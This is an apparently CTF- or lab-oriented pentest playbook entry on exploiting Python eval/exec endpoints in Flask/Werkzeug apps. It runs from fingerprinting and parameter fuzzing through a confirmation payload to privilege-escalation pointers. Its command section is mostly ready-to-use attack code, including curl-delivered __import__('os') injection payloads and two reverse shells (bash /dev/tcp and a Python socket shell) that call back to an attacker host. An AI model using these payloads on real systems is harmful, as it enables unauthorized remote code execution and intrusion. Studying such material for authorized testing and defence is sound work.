title: Python eval / exec Endpoint — Werkzeug/Flask RCE
body:
A Python web app (Werkzeug/Flask/Bottle, often on an odd port like 5000/8000/18000/50000) that takes user input and feeds it to eval()/exec() is direct RCE. The tells: a Werkzeug Server header in nmap ('Werkzeug/1.0.1 Python/3.6.8'), a Ruby/Rails or Python error page leaking the stack, or a route like /verify, /run, /eval, /calc, /api that accepts a 'code'/'cmd'/'data' parameter.

FIND THE ENDPOINT FIRST. Content-discover the app (feroxbuster), and if it's Rails read /rails/info/routes to see every route. For a bare API, fuzz parameter names against the candidate routes — the param is usually 'code', 'cmd', 'input', 'data', 'expr', or 'q'.

GET often gets sanitized or blocked while POST goes straight to the evaluator — if GET 400s or escapes your payload, switch to POST with --data-urlencode. The classic payload is __import__('os').system('<cmd>') or os.popen('<cmd>').read(), trailing '#' to comment out whatever the app appends after your input.

This lands you as the web app's user (often a service account). It's a FOOTHOLD — from here you upgrade the shell and pivot to Linux privesc (sudo -l, writable services, SUID).
cmd:
# ════════════════════════════════════════════════════════
# 1. FINGERPRINT — is it a Python app?
# ════════════════════════════════════════════════════════
curl -sI http://$ip:PORT/                       # Server: Werkzeug/1.0.1 Python/3.6.8  => Flask
whatweb http://$ip:PORT/
# Rails app? dump every route:
curl -s http://$ip:PORT/rails/info/routes

# ════════════════════════════════════════════════════════
# 2. FIND the eval endpoint + parameter
# ════════════════════════════════════════════════════════
feroxbuster -u http://$ip:PORT -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2
# candidate routes: /verify /run /eval /calc /api /exec     params: code cmd input data expr q
ffuf -u http://$ip:PORT/verify -X POST -d 'FUZZ=test' -w params.txt -mc all -fs 0

# ════════════════════════════════════════════════════════
# 3. CONFIRM execution (don't jump straight to a shell)
# ════════════════════════════════════════════════════════
curl -s -X POST --data-urlencode 'code=__import__("os").popen("id").read()#' http://$ip:PORT/verify
# returns uid=...  => you have RCE. If GET was blocked/escaped, POST usually isn't.

# ════════════════════════════════════════════════════════
# 4. REVERSE SHELL  (listener: nc -nlvp $lport)
# ════════════════════════════════════════════════════════
curl -s -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/$lhost/$lport 0>&1")#' http://$ip:PORT/verify

# pure-python fallback (no bash/nc on the box):
curl -s -X POST --data-urlencode 'code=__import__("os").system("python3 -c \'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")\'")#' http://$ip:PORT/verify

# Werkzeug debug console exposed (PIN-locked)? /console — try the debugger if no eval route exists.

# ════════════════════════════════════════════════════════
# 5. STABILIZE → pivot
# ════════════════════════════════════════════════════════
python3 -c 'import pty;pty.spawn("/bin/bash")'   # then Ctrl-Z; stty raw -echo; fg
sudo -l                                          # first privesc check as the web user
warn: Quoting in the curl payload is the usual time-sink: keep the OUTER shell quote single, URL-encode with --data-urlencode so '&', '#', and spaces survive, and trail your payload with '#' to kill whatever the app concatenates after it. If POST returns the app's error page instead of output, the param name is wrong — fuzz it. 'system()' returns an exit code (not output); use popen().read() when you need to SEE the result.

choices.label: Got RCE — caught a reverse shell
Shell is dumb — upgrade the TTY
Landed as a service user — Linux privesc
Looks like a template, not eval — try SSTI
